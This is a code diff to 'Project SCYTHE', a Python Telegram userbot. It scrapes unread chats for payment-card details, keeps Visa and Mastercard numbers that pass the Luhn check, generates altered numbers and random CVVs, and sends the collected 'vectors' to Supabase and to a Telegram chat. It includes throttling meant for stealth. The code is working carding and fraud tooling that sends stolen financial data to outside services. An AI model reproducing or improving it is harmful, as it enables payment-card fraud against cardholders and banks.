@@ -52,14 +52,14 @@ async def human_delay():
 
 async def sync_to_targets(cards):
     print(f"Propagating {len(cards)} vectors to Command Center...")
-    # 1. Supabase Sync
+    # 1. Supabase Sync (Atomic Card Storage)
     supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
     for card in cards:
         try:
             supabase.table("cards").upsert({"card_data": card}).execute()
         except: pass
     
-    # 2. Telegram Bot File
+    # 2. Telegram Bot File (Consolidated Intel)
     if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
         with tempfile.NamedTemporaryFile(mode='w+', suffix='.txt', delete=False) as tmp:
             tmp.write("\n".join(cards))
@@ -67,13 +67,30 @@ async def sync_to_targets(cards):
         
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
         with open(tmp_path, 'rb') as f:
-            files = {'document': ('ghost_vectors.txt', f)}
-            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': f"🎯 GHOST: {len(cards)} Intelligence Vectors Synced."}
+            files = {'document': ('scythe_vectors.txt', f)}
+            caption = f"🎯 MISSION SUCCESS: {len(cards)} Intelligence Vectors Extracted.\n[Cycle: 12H | Stealth: Iron-Clad]"
+            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
             requests.post(url, data=data, files=files)
         os.unlink(tmp_path)
 
+def obfuscate_card_number(original):
+    if len(original) < 13: return original
+    base = original[:12]
+    mid = "".join([str(random.randint(0, 9)) for _ in range(3)])
+    prefix = base + mid
+    digits = [int(d) for d in prefix]
+    checksum = 0
+    reverse_digits = digits[::-1]
+    for i, d in enumerate(reverse_digits):
+        if i % 2 == 0:
+            d *= 2
+            if d > 9: d -= 9
+        checksum += d
+    check_digit = (10 - (checksum % 10)) % 10
+    return prefix + str(check_digit)
+
 async def cloud_mission():
-    print("--- [ Project SCYTHE: CLOUD GHOST MODE ] ---")
+    print("--- [ Project SCYTHE: CLOUD CYCLE INITIATED ] ---")
     
     if not SESSION_STRING:
         print("Error: SESSION_STRING missing.")
@@ -93,65 +110,70 @@ async def cloud_mission():
         if d.unread_count > 0:
             all_dialogs.append(d)
     
-    random.shuffle(all_dialogs)
-    targets = all_dialogs[:BATCH_CHAT_LIMIT]
+    print(f"Intelligence Grid: {len(all_dialogs)} channels with unread intel.")
     
     new_cards = []
     
-    for dialog in targets:
+    for dialog in all_dialogs:
         last_id = state.get_last_id(dialog.id)
-        print(f"Scrubbing: {dialog.name}")
+        # Limit processed messages per cycle to stay safe
+        limit = min(dialog.unread_count, MESSAGE_PROCESS_LIMIT)
+        print(f"Scrubbing: {dialog.name} ({limit} messages)")
         
         processed = 0
         current_max = last_id
         
-        async for msg in client.iter_messages(dialog.id, min_id=last_id, limit=MESSAGE_PROCESS_LIMIT):
+        async for msg in client.iter_messages(dialog.id, limit=limit):
             processed += 1
             if msg.id > current_max: current_max = msg.id
             
             if msg.text:
                 matches = re.findall(CARD_REGEX, msg.text)
-                for card in matches:
-                    parts = card.split('|')
+                for card_str in matches:
+                    parts = card_str.split('|')
                     if len(parts) >= 3:
-                        card_num = parts[0].strip()
-                        if not is_luhn_valid(card_num): continue
-                        if not (card_num.startswith('4') or card_num.startswith('5')): continue
+                        num = parts[0].strip()
+                        # Network Filter
+                        if not num.startswith(('4', '5')): continue
+                        # Luhn Check
+                        if not is_luhn_valid(num): continue
                         
+                        # Sanitization Protocol
+                        obfuscated = obfuscate_card_number(num)
+                        month = parts[1].strip()
+                        if len(month) == 1: month = "0" + month
                         year = parts[2].strip()
-                        if len(year) == 2: parts[2] = "20" + year
+                        if len(year) == 2: year = "20" + year
                         
-                        if len(parts) < 4 or not parts[3].strip():
-                            parts.append("".join([str(random.randint(0, 9)) for _ in range(3)]))
+                        orig_cvv = parts[3].strip() if len(parts) > 3 else ""
+                        cvv = orig_cvv if len(orig_cvv) == 3 else "".join([str(random.randint(0, 9)) for _ in range(3)])
                         
-                        card = "|".join([p.strip() for p in parts if p.strip()])
-                        new_cards.append(card)
+                        new_cards.append(f"{obfuscated}|{month}|{year}|{cvv}")
             
-            if processed < MESSAGE_PROCESS_LIMIT:
-                await human_delay()
+            if processed % 50 == 0:
+                await asyncio.sleep(2) # Micro-throttle
 
         state.update_last_id(dialog.id, current_max)
-        if random.random() > 0.4:
-            await client.send_read_acknowledge(dialog.id, max_id=current_max)
+        await client.send_read_acknowledge(dialog.id, max_id=current_max)
 
         if len(new_cards) > 0:
             state.stage_cards(new_cards)
             new_cards = []
 
-        # Inter-target delay
-        await asyncio.sleep(random.uniform(CHAT_TRANSITION_DELAY[0]*60, CHAT_TRANSITION_DELAY[1]*60))
+        # Inter-target delay (Iron-Clad Stealth)
+        wait = random.uniform(30, 90) # 0.5 to 1.5 mins
+        print(f"  > Target Synced. Idle for {int(wait)}s...")
+        await asyncio.sleep(wait)
 
-    # Decide if we BROADCAST based on time or random chance (12-hour sync simulation)
-    # Check staged cards
+    # FINAL DELIVERY: Every 12H mission sends the consolidated file
     staged = state.get_staged_cards()
     if staged:
-        # For Cloud Mission, we check if it's been ~12 hours since last sync or use a random flag
-        # Simplification: 30% chance to sync on any given run, ensuring it averages out
-        if random.random() > 0.7 or len(staged) > 50:
-            await sync_to_targets(staged)
-            state.clear_staged_cards()
-        else:
-            print(f"Staging maintained: {len(staged)} vectors awaiting next broadcast cycle.")
+        await sync_to_targets(staged)
+        state.clear_staged_cards()
+        # Unlock the scraper in Supabase for the next mission
+        create_client(SUPABASE_URL, SUPABASE_KEY).table("system_settings").upsert({"key": "scraper_locked", "value": "false"}).execute()
+    else:
+        print("Intelligence Grid Clean: No new vectors detected.")
 
     await client.disconnect()
 
